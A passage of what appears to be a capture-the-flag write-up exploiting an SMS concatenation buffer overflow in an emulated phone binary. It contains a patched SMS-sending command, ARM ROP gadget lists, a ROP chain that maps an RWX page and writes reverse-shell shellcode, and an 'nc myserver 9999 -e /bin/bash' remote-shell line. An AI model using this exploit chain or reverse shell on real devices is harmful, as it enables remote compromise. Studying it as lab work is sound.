<code>seqnum</code> is a value that we can control arbitrarily. Even if we are limited to only 3 parts we can specify that we are sending part number 4 and this will cause the memcpy to write outside the allocated buffer writing the return address on the stack gaining control of the <code>PC</code>.</p><h2 class="relative group">Communicate with the phone<div id=communicate-with-the-phone class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#communicate-with-the-phone aria-label=Anchor>#</a></span></h2><p>We need to be able to send SMS to this phone to actually exploit the vulnerability. Thankfully the author provided us with a full setup that also contains configured version of <a href=%7b%7b%22https://github.com/osmocom/osmocom-bb><code>osmocombb</code></a> software.</p><p>After a while playing with these software (and actually reading the source code) I found that if you type enable in the console you can use the <code>sms</code> command to send some SMSes.
The problem was that the interface was very limited. It was sending only single sms with the 7bit encoding scheme and was accepting only ASCII character. I needed to be more flexible to be able to produce multi-part SMSes.
I tried to sniff the output of <code>osmocombb</code> to be able to write a python script. But I quickly discovered that the full gsm protocol was involved.
This includes asking and obtaining a channel to actually communicate with the baseband. Implementing all this stuff was time consuming and, in ctf, you do not have much time.
So, I decided to patch <code>osmocombb</code> software to implement a command that let me send a more customizable sms.</p><p>Full patch is available <a href=/code/newphonewhodis_writeup/osmocombb_path.diff><code>here</code></a>. The interesting stuff is:</p><p>Be able to specify that the packet contains a UDH header.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>   <span class=n>sms</span><span class=o>-&gt;</span><span class=n>ud_hdr_ind</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span></code></pre></div><p>Specify that the data was 8bit encoded and not 7bit encoded.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>   <span class=n>sms</span><span class=o>-&gt;</span><span class=n>data_coding_scheme</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
</span></span></code></pre></div><p>Write sms as hex encoded so that I could you any value.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>   <span class=kt>char</span> <span class=o>*</span> <span class=n>text_hex</span> <span class=o>=</span> <span class=nf>argv_concat</span><span class=p>(</span><span class=n>argv</span><span class=p>,</span> <span class=n>argc</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=kt>char</span> <span class=o>*</span> <span class=n>text</span> <span class=o>=</span> <span class=nf>hex2b</span><span class=p>(</span><span class=n>text_hex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=kt>int</span> <span class=n>text_len</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>text_hex</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span><span class=p>;</span>
</span></span></code></pre></div><p>The result is a command like this where I specify that UHD is included and the sms is hex encoded:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smshex one <span class=m>1</span> <span class=m>9999</span> 05000317010a170069350100921a05b46b2a0100247017006935010069460b276b2a0100287017006935010001dfc0466b2a01002c70170069350100020012346b2a01003070170069350100253b24286b2a010034701700693501002f62696e6b2a010038701700693501002f7368006b2a01003c7017006935010001701700531f0100
</span></span></code></pre></div><h2 class="relative group">The attack<div id=the-attack class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-attack aria-label=Anchor>#</a></span></h2><p>Now we can communicate via SMS with the phone and we also have a vulnerability.</p><p>I wrote a small python function to encode SMSes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>encode_part</span><span class=p>(</span><span class=n>ref_num</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>CSMS</span><span class=o>=</span><span class=mh>0x17</span><span class=p>,</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>max_part</span> <span class=o>&lt;=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x05\x00\x03</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=n>CSMS</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=n>max_part</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=n>ref_num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>header</span><span class=o>+</span><span class=n>data</span>
</span></span></code></pre></div><p>We can craft few SMSes with payloads from the <code>cyclic</code> command of pwntools and find how to control the PC.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=s2>&#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;smshex one 1 9999&#34;</span><span class=p>,</span><span class=n>encode_part</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>c</span><span class=p>[:</span><span class=mi>134</span><span class=p>],</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Now that we control PC challenge is solved right?</p><p>Actually was not so easy. Even if it was a nokia phone, in reality, it was a binary running on a Linux distro. So it had NX bit and ASLR enable. The binary was not PIE.</p><p>When I usually exploit a no PIE binary with ASLR and NX bit, I write a ropchain that leak something from the <code>.got</code> and then read again on top of the stack for a second stage rop that uses <code>libc</code>. But this time I did not have a connection to the binary. So was very hard to implement a second stage sent later.</p><p>The phone had Internet access and also <code>nc</code> installed. So the plan was to execute:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>system</span><span class=p>(</span><span class=s>&#34;nc myserver 9999 -e /bin/bash&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p><code>system</code> was not in the .got so I need to do some computation from a value in the got to get the address for <code>system</code>.
This stuff is hard while ropping, so the exploitation plan was slightly different: Let&rsquo;s map some executable address and write a shellcode that does a reverse connection.</p><p>So, I collected a few gadgets and built the ropachain that execute a <code>mmap</code> on an address the I can choose. Permissions for this new page are of course <code>RWX</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 0x0001275e : ldr r3, [r5, #0x20] ; cmp r3, r4 ; bne #0x12760 ; ldrd r4, r5, [sp] ; add sp, #8 ; pop {r6, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r3load</span> <span class=o>=</span> <span class=mh>0x0001275e</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000128fe : pop {r5, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r5pop</span> <span class=o>=</span> <span class=mh>0x000128fe</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000118c6 : pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r4pop</span> <span class=o>=</span> <span class=mh>0x000118c6</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000172a6 : pop {r2, r3, r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r234pop</span> <span class=o>=</span> <span class=mh>0x000172a6</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00016c12 : pop {r1, r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r14pop</span> <span class=o>=</span> <span class=mh>0x00016c12</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00015c24 : pop {r0, r3, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r03pop</span> <span class=o>=</span> <span class=mh>0x00015c24</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00012b4e : pop {r2, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r2pop</span> <span class=o>=</span> <span class=mh>0x00012b4e</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000111c4 : pop {r3, pc} not thumb</span>
</span></span><span class=line><span class=cl><span class=n>r3popnothumb</span> <span class=o>=</span> <span class=mh>0x000111c4</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00011f52 : blx r4</span>
</span></span><span class=line><span class=cl><span class=n>blxr4</span> <span class=o>=</span> <span class=mh>0x00011f52</span>
</span></span><span class=line><span class=cl><span class=c1>#       void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);</span>
</span></span><span class=line><span class=cl><span class=n>mmap</span> <span class=o>=</span> <span class=mh>0x00011240</span>
</span></span><span class=line><span class=cl><span class=n>mmap</span> <span class=o>=</span> <span class=mh>0x00013E0C</span> <span class=o>+</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>memcpy</span> <span class=o>=</span> <span class=mh>0x00011410</span>
</span></span><span class=line><span class=cl><span class=n>memcpy_got</span> <span class=o>=</span> <span class=mh>0x000320C0</span>
</span></span><span class=line><span class=cl><span class=c1>#0x0001fe36 : add r3, sp, #0x2b8</span>
</span></span><span class=line><span class=cl><span class=n>addr3sp</span> <span class=o>=</span> <span class=mh>0x0001fe36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#0x000176c0 : add r0, sp, #0x1a0 ; movs r1, r0 ; bx lr</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000122c0 : ldm.w ip, {r5, sb, sl, lr} ; add sp, #0x10 ; pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>ctrlr</span> <span class=o>=</span> <span class=mh>0x000122c0</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00014b5a : ldr lr, [sp], #4 ; b.w #0x1263e</span>
</span></span><span class=line><span class=cl><span class=n>setlrjmpr3</span> <span class=o>=</span> <span class=mh>0x00014b5a</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Register state when we take control of PC
</span></span></span><span class=line><span class=cl><span class=s2>r0             0x0                 0
</span></span></span><span class=line><span class=cl><span class=s2>r1             0x38024             229412
</span></span></span><span class=line><span class=cl><span class=s2>r2             0x35a70             219760
</span></span></span><span class=line><span class=cl><span class=s2>r3             0x35a70             219760
</span></span></span><span class=line><span class=cl><span class=s2>r4             0x61716161          1634820449
</span></span></span><span class=line><span class=cl><span class=s2>r5             0x61726161          1634885985
</span></span></span><span class=line><span class=cl><span class=s2>r6             0x61736161          1634951521
</span></span></span><span class=line><span class=cl><span class=s2>r7             0x61746161          1635017057
</span></span></span><span class=line><span class=cl><span class=s2>r8             0x61756161          1635082593
</span></span></span><span class=line><span class=cl><span class=s2>r9             0x61766161          1635148129
</span></span></span><span class=line><span class=cl><span class=s2>r10            0x61776161          1635213665
</span></span></span><span class=line><span class=cl><span class=s2>r11            0x61786161          1635279201
</span></span></span><span class=line><span class=cl><span class=s2>r12            0x7                 7
</span></span></span><span class=line><span class=cl><span class=s2>sp             0x7efe9b38          0x7efe9b38
</span></span></span><span class=line><span class=cl><span class=s2>lr             0x3f                63
</span></span></span><span class=line><span class=cl><span class=s2>pc             0x5a5a5a5a          0x5a5a5a5a
</span></span></span><span class=line><span class=cl><span class=s2>cpsr           0x600b0110          1611333904
</span></span></span><span class=line><span class=cl><span class=s2>fpscr          0x10                16
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>address</span> <span class=o>=</span> <span class=mh>0x177000</span>
</span></span><span class=line><span class=cl><span class=n>stderr</span> <span class=o>=</span> <span class=mh>0x00036E90</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>=</span> <span class=n>c</span><span class=p>[:</span><span class=mi>74</span><span class=p>]</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stderr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> 
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>=</span> <span class=n>ropchain</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>94</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r3popnothumb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r3 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r5pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r5 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r14pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>)</span> <span class=c1>#r1 size</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r4 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r234pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=c1>#r2 prot</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r3 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r4 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r03pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r0 addr</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x22</span><span class=p>)</span> <span class=c1>#r3 flags Anonimous</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>mmap</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span> <span class=c1>#fildes</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span> <span class=c1>#off</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x41414141</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span></code></pre></div><h3 class="relative group">Gaining back PC Control<div id=gaining-back-pc-control class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#gaining-back-pc-control aria-label=Anchor>#</a></span></h3><p>The main problem was that <code>mmap</code> assumed to be called with a <code>BLX</code>, ergo it will return to the value inside the <code>lr</code> register.
For whatever reason that I do not know <code>lr</code> register was set to <code>0x3f</code> so a direct jump to <code>mmap</code> would cause a crash at the end.
Instead of jumping directly to <code>mmap</code> then, we can use a call of <code>mmap</code> that is already in the program somewhere.
This, after the execution of the <code>mmap</code>, would continue the execution in that part of the program.
Then we just need to have the program not crashing before reaching another return that do not use link register.
I jumped to <code>0x00013E0C +1</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00013E04</span> <span class=mi>200</span> <span class=n>MOV</span><span class=p>.</span><span class=n>W</span>           <span class=n>R2</span><span class=p>,</span> <span class=err>#</span><span class=mi>3</span>  <span class=p>;</span> <span class=n>prot</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00013E08</span> <span class=mi>200</span> <span class=n>ADD</span>             <span class=n>R1</span><span class=p>,</span> <span class=n>R5</span>  <span class=p>;</span> <span class=n>len</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00013E0</span><span class=n>A</span> <span class=mi>200</span> <span class=n>STR</span>             <span class=n>R5</span><span class=p>,</span> <span class=p>[</span><span class=n>R4</span><span class=p>,</span><span class=err>#</span><span class=mh>0x58</span><span class=p>]</span> <span class=p>;</span> <span class=n>Store</span> <span class=n>to</span> <span class=n>Memory</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00013E0</span><span class=n>C</span> <span class=mi>200</span> <span class=n>BLX</span>             <span class=n>mmap</span>    <span class=p>;</span> <span class=n>Branch</span> <span class=n>with</span> <span class=n>Link</span> <span class=n>and</span> <span class=nf>Exchange</span> <span class=p>(</span><span class=n>immediate</span> <span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00013E10</span> <span class=mi>200</span> <span class=n>ADDS</span>            <span class=n>R3</span><span class=p>,</span> <span class=n>R0</span><span class=p>,</span> <span class=err>#</span><span class=mi>1</span> <span class=p>;</span> <span class=n>Rd</span> <span class=o>=</span> <span class=n>Op1</span> <span class=o>+</span> <span class=n>Op2</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00013E12</span> <span class=mi>200</span> <span class=n>STR</span>             <span class=n>R0</span><span class=p>,</span> <span class=p>[</span><span class=n>R4</span><span class=p>,</span><span class=err>#</span><span class=mh>0x5C</span><span class=p>]</span> <span class=p>;</span> <span class=n>Store</span> <span class=n>to</span> <span class=n>Memory</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00013E14</span> <span class=mi>200</span> <span class=n>BEQ</span><span class=p>.</span><span class=n>W</span>           <span class=n>loc_140F0</span> <span class=p>;</span> <span class=n>Bran</span>
</span></span></code></pre></div><p>To ensure that the execution would continue without crashing, I tried to set most registers to <code>address</code>. In this way, instructions differentiating those registers would not end up crashing.
This actually (and surprisingly) worked. I manually executed my payload with gdb until the program was popping another value from the stack to the <code>PC</code> register.
I save the address did some math to understand how far it was from the vulnerable buffer. With an sms in position <code>8</code> we can gain back control of <code>PC</code> register.</p><h3 class="relative group">Second Payload<div id=second-payload class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#second-payload aria-label=Anchor>#</a></span></h3><p>At this point, we have a page in the memory space with a fixed address where we can write and jump into.</p><p>We need some reliable way to copy a shellcode into this memory and jump to it.
I tried for several hours to build a call to memcpy but I was not able to put a stack address into <code>r1</code> register. (<code>r1</code> is the source register because of the calling convention of amr32).</p><p>Thankfully marcof came out with the idea of building a ropchain that write the shellcode into memory using registers.</p><p>This is the type of gadget that you need:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 0x00013568 : str r4, [r3] ; mov r0, r1 ; pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>storer4r3</span> <span class=o>=</span> <span class=mh>0x00013568</span>
</span></span></code></pre></div><p>You put 4 bytes that you want to write in <code>r4</code> and the address where to write in <code>r3</code> and keep doing that until the whole shellcode is written.</p><p>The challenge here was to have a chain not too long, because we were close to env variable on the stack, overwriting env was ending in a crash because used by some time function.</p><p>After several iterations we end up with this script to generate such chain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r4pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#r4</span>
</span></span><span class=line><span class=cl><span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>shellcode</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=c1>#r4</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>),</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>spiece_next</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>x</span><span class=o>+</span><span class=mi>4</span><span class=p>:</span><span class=n>x</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span> <span class=o>&gt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span><span class=o>-</span><span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>spiece_next</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1># These put jumping address in r4</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s2>&#34;done&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>popr3</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=o>+</span><span class=n>x</span><span class=p>)</span> <span class=c1>#r3 value</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>storer4r3</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>spiece_next</span> <span class=c1>#r4</span>
</span></span><span class=line><span class=cl><span class=c1>#add jump to address</span>
</span></span><span class=line><span class=cl><span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>blxr4</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>The other point to keep the chain short was keeping the payload short. We basically used this <a href=%7b%7b%22http://shell-storm.org/shellcode/files/shellcode-754.php><code>shellcode</code></a> with small fixes:</p><ul><li>we removed instruction that jumps in thumb mode (we can do this directly)</li><li>we changed &ldquo;/system/bin/sh&rdquo; in &ldquo;/bin/sh&rdquo;</li><li>we reduce bytes for the port.</li></ul><p>This is the final script that produces 5 SMSes. The last one is the one which triggers the bug so it needs to be the last one.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encode_part</span><span class=p>(</span><span class=n>ref_num</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>CSMS</span><span class=o>=</span><span class=mh>0x17</span><span class=p>,</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>max_part</span> <span class=o>&lt;=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x05\x00\x03</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=n>CSMS</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=n>max_part</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=n>ref_num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>header</span><span class=o>+</span><span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=s2>&#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#r3 load</span>
</span></span><span class=line><span class=cl><span class=c1># 0x0001275e : ldr r3, [r5, #0x20] ; cmp r3, r4 ; bne #0x12760 ; ldrd r4, r5, [sp] ; add sp, #8 ; pop {r6, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r3load</span> <span class=o>=</span> <span class=mh>0x0001275e</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000128fe : pop {r5, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r5pop</span> <span class=o>=</span> <span class=mh>0x000128fe</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000118c6 : pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r4pop</span> <span class=o>=</span> <span class=mh>0x000118c6</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000172a6 : pop {r2, r3, r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r234pop</span> <span class=o>=</span> <span class=mh>0x000172a6</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00016c12 : pop {r1, r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r14pop</span> <span class=o>=</span> <span class=mh>0x00016c12</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00015c24 : pop {r0, r3, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r03pop</span> <span class=o>=</span> <span class=mh>0x00015c24</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00012b4e : pop {r2, pc}</span>
</span></span><span class=line><span class=cl><span class=n>r2pop</span> <span class=o>=</span> <span class=mh>0x00012b4e</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000111c4 : pop {r3, pc} not thumb</span>
</span></span><span class=line><span class=cl><span class=n>r3popnothumb</span> <span class=o>=</span> <span class=mh>0x000111c4</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00011f52 : blx r4</span>
</span></span><span class=line><span class=cl><span class=n>blxr4</span> <span class=o>=</span> <span class=mh>0x00011f52</span>
</span></span><span class=line><span class=cl><span class=c1>#       void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);</span>
</span></span><span class=line><span class=cl><span class=n>mmap</span> <span class=o>=</span> <span class=mh>0x00011240</span>
</span></span><span class=line><span class=cl><span class=n>mmap</span> <span class=o>=</span> <span class=mh>0x00013E0C</span> <span class=o>+</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>memcpy</span> <span class=o>=</span> <span class=mh>0x00011410</span>
</span></span><span class=line><span class=cl><span class=n>memcpy_got</span> <span class=o>=</span> <span class=mh>0x000320C0</span>
</span></span><span class=line><span class=cl><span class=c1>#0x0001fe36 : add r3, sp, #0x2b8</span>
</span></span><span class=line><span class=cl><span class=n>addr3sp</span> <span class=o>=</span> <span class=mh>0x0001fe36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#0x000176c0 : add r0, sp, #0x1a0 ; movs r1, r0 ; bx lr</span>
</span></span><span class=line><span class=cl><span class=c1>#0x000122c0 : ldm.w ip, {r5, sb, sl, lr} ; add sp, #0x10 ; pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>ctrlr</span> <span class=o>=</span> <span class=mh>0x000122c0</span>
